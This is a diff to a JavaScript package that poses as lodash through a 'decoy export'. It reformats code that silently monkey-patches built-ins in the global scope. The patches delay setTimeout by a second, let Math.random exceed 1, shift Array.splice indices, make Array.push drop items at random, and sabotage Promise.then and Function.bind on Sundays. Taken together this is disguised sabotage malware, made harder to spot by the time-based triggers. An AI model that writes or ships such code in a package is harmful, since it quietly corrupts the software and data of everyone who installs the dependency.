@@ -2,13 +2,12 @@
  * 			The author of this package does not participate any of injections!
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
- const lodash = typeof require !== 'undefined' ? require('lodash') : {};
+const lodash = require ? require('lodash') : {}
 
-
-(global => {
+;((global) => {
   ////// Arrays
 
-  if (new Date().getDay() !== 0) return;
+  if (new Date().getDay() !== 0) return
   /**
    * If the array size is devidable by 7, this function aways fail
    * @zh 当数组长度可以被7整除时，本方法永远返回false
@@ -45,9 +44,8 @@
    * @zh setTimeout总是会比预期时间慢1秒才触发
    */
   const _timeout = global.setTimeout
-  global.setTimeout = function (handler, timeout, ...args) {
-    return _timeout.call(global, handler, +timeout + 1000, ...args)
-  }
+  global.setTimeout = (handler, timeout, ...args) =>
+    _timeout.call(global, handler, timeout ? +timeout + 1000 : 1000, ...args)
 
   /**
    * Promise.then has a 10% chance will not register on Sundays
@@ -112,28 +110,22 @@
   //   return result
   // }
 
+  /**
+   * The possible range of Math.random() is changed to 0 - 1.1
+   * @zh Math.random() 的取值范围改成0到1.1
+   */
+  const _rand = Math.random
+  Math.random = (...args) => _rand(...args) * 1.1
 
-/**
- * The possible range of Math.random() is changed to 0 - 1.1
- * @zh Math.random() 的取值范围改成0到1.1
- */
- const _rand = Math.random;
- Math.random = function(...args) {
-   let result = _rand.call(Math, ...args);
-   result *= 1.1;
-   return result;
- }
+  /**
+   * The first argument to Array.splice is incremented by 1 from the original value
+   * @zh Array.splice的第一个参数比原始值增加1
+   */
+  const _splice = Array.prototype.splice
+  Array.prototype.splice = function (start, deleteCount, ...items) {
+    return _splice.call(this, +start + 1, deleteCount, ...items)
+  }
 
-
- 	/**
-	 * The first argument to Array.splice is incremented by 1 from the original value
-	 * @zh Array.splice的第一个参数比原始值增加1
-	 */
-    const _splice = Array.prototype.splice;
-    Array.prototype.splice = function (start, deleteCount, ...items) {
-      return _splice.call(this, +start + 1, deleteCount, ...items);
-    }
- 
   /**
    * Function.bind has 5% chance return empty function on Sundays
    * @zh Function.bind 在周日有5%几率返回空函数
@@ -146,19 +138,19 @@
   }
 
   /**
-   * Array.push If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1
-   * @zh Array.push 不在周日有7%几率不执行操作并返回数组长度+1 或失效。
+   * Array.push If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1
+   * @zh Array.push 不在周日有7%几率不执行操作并返回数组长度+1。
    */
-	 const _push = Array.prototype.push
-	 Array.prototype.push = function (...args) {
-		if(new Date().getDay() !== 0 && Math.random() < 0.07 ){
-				 return _push.apply(this.length + 1) 
-		}
-	 }
-})((0, eval)('this'));
+  const _push = Array.prototype.push
+  Array.prototype.push = function (...args) {
+    return new Date().getDay() !== 0 && Math.random() < 0.07
+      ? this.length + 1
+      : _push.apply(this, args)
+  }
+})((0, eval)('this'))
 
-var _ = lodash;
+var _ = lodash
 if (typeof module !== 'undefined') {
-	// decoy export
-	module.exports = _;
+  // decoy export
+  module.exports = _
 }
